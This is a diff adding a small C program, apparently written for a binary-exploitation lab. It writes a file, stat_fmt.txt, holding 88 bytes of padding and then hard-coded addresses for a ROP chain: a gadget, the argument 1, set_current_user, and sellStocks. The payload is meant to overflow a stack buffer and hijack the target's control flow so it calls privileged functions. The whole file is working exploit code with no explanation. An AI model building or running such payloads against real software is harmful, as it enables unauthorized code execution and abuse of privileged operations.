@@ -1,0 +1,41 @@
+#include <stdio.h>
+
+
+char bigBuffer[120];
+
+char* insert8Bytes(long long num, char* curBuf) {
+	for(int temp=0;temp<8;temp++) {
+		char msb = (num & 0xFF);
+		*(curBuf++) = msb;
+		num >>= 8;
+	}
+	return curBuf;
+}
+
+int main() {
+
+	FILE *fp = fopen("stat_fmt.txt", "w");
+
+	char *curBuf = bigBuffer;
+	for(int temp='a';temp<'l';temp++) {
+
+		for(int temp2 = 0; temp2<8;temp2++) {
+			*(curBuf++) = temp;
+		}
+	}
+
+
+	long long rdpGadget = 0x7FFFF7DE8B6A;
+	curBuf = insert8Bytes(rdpGadget, curBuf);
+
+	long long one = 1;
+	curBuf = insert8Bytes(one, curBuf);
+
+	long long set_current_user = 0x555555555289;
+	curBuf = insert8Bytes(set_current_user, curBuf);
+
+	long long sellStocks = 0x5555555552a6;
+	curBuf = insert8Bytes(sellStocks, curBuf );
+
+	fwrite(bigBuffer, 120, 1, fp );
+}
